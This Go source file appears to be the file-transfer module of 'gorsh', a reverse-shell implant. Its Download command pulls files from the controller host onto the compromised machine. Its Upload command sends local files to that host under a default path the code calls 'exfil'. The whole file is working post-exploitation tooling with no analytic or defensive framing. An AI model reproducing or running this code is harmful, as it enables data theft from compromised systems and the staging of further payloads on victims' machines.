package cmds

import (
	"fmt"
	"path/filepath"

	"git.i.ctrl.red/blink/gorsh/pkg/fetch"
	"git.i.ctrl.red/blink/gorsh/pkg/myconn"
	"github.com/abiosoft/ishell"
)

func Download(c *ishell.Context) {
	if len(c.Args) < 1 {
		c.Println(c.Cmd.Help)
		return
	}

	if len(c.Args) == 1 {
		dst := filepath.Base(c.Args[0])
		c.Args = append(c.Args, dst)
	}

	src := fmt.Sprintf("//%s/%s", myconn.Host(), c.Args[0])
	bytes, err := fetch.Get(src, c.Args[1])
	if err != nil {
		c.Println(err)
		return
	}
	c.Printf("Copied %d bytes from %s to %s\n", bytes, src, c.Args[1])
}

func Upload(c *ishell.Context) {
	if len(c.Args) < 1 {
		c.Println(c.Cmd.Help)
		return
	}

	// TODO: make default exfil path configurable
	if len(c.Args) == 1 {
		dst := filepath.Base(c.Args[0])
		defaultExfil := fmt.Sprintf("e/%s", dst)
		c.Args = append(c.Args, defaultExfil)
	}

	dst := fmt.Sprintf("//%s/%s", myconn.Host(), c.Args[1])
	bytes, err := fetch.Copy(c.Args[0], dst)
	if err != nil {
		c.Println(err)
		return
	}
	c.Printf("Copied %d bytes to %s from %s\n", bytes, dst, c.Args[1])
}
